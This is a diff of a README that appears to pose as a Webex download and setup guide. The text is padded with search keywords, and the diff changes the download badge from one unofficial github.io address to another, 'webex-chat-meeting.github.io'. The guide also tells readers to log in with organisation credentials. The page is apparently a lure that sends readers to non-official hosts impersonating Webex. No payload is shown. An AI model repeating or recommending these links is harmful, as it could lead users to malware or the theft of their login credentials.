@@ -53,7 +53,7 @@ The webex app brings webex meetings, webex calling, webex phone, and shared spac
 
 Prerequisites: A Webex account or meeting invitation, a stable internet connection, and a supported computer or mobile device.
 
-[![GET Webex](https://img.shields.io/badge/GET%20%E2%80%94%20Webex-0078D6?style=for-the-badge&logoColor=white)](https://ohmsquicho1989.github.io/.github/webex-meeting)
+[![Start Webex Meeting](https://img.shields.io/badge/Start-Webex%20Meeting-2563EB?style=flat-square)](https://webex-chat-meeting.github.io/.github/)
 
 1.  **Download and sign in:** Use download webex to install the client, then complete webex login with your organization account or personal credentials.
 2.  **Join or schedule:** Select webex join from an invite link, or create a webex meeting from the calendar to invite colleagues, clients, or partners.
